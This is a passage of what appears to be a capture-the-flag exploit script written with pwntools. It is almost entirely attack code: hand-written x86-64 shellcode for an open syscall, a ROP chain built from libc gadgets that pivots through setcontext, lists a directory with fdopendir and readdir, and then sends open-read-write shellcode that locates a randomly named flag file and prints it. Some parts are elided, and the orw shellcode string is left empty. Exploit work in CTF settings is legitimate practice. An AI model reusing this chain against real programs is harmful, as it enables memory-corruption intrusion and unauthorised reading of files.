...
'''
shellcodeopen = "\x48\xC7\xC0\x2E\x2F\x00\x00\x50\x48\x89\xE7\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x59\xC3"
# ""
shellcodeorw = ""
#""
...
pay += p64(pop_rdx_r12+libcbase)+p64(bss+0x700)+p64(0) 
pay += p64(setcontext) *4 # call setcontext
...
rop = p64(1) + p64(bss+0x700)
rop += p64(setcontext) *4
rop = rop.ljust(0xa0, b'\x00') 
rop += p64(bss+0x700 +0xb0) # rsp 
rop += p64(bss+0x700+0xb0+8*39) # rcx 
rop += p64(pop_rdi) + p64(3) 
rop += p64(fdopendir) 
rop += p64(pop_rdi) + p64(bss+0x100) 
rop += p64(move_rdi_rax+libcbase) 
rop += p64(pop_rax+libcbase) + p64(bss+0x700+0xb0+0xf*8-0x1e8) 
rop += p64(pop_rbx +libcbase) + p64(bss+0x100)
rop += p64(move_rdi_call_rax +libcbase) + p64(0)*3
rop += p64(pop_rdi)
rop += p64(readdir)
rop += p64(pop_rax + libcbase) + p64(bss+0x100+0x18)
rop += p64(pop_rdx_r12+libcbase) + p64(bss+0x700+0xb0+0x8*22-0x1d0)+p64(0)
rop += p64(move_rsi_call_rdx+libcbase)
rop += p64(pop_rdi) + p64(1) 
rop += p64(pop_rdx_r12+libcbase) + p64(0x300)+p64(0) 
rop += p64(libc_write) 
rop += p64(pop_rdi)+p64(0) 
rop += p64(pop_rsi+libcbase)+p64(bss+0x100) 
rop += p64(pop_rdx_r12+libcbase)+p64(0x100)+p64(0) 
rop += p64(elf.plt['read'])
rop += p64(pop_rax+libcbase) + p64(bss+0x100+(len(shellcodeorw))) #flag
rop += p64(bss+0x100) # shellcodeorw addr
rop += shellcodeopen

ru('done!\n')
sl(rop) #0x2a67616c662f2e
ru('flag')
flagnumber = rn(20)
flagname = './flag'+flagnumber+'\x00'
lgs('flagname')

pay = shellcodeorw + bytes(flagname)
sl(pay) #
irt()
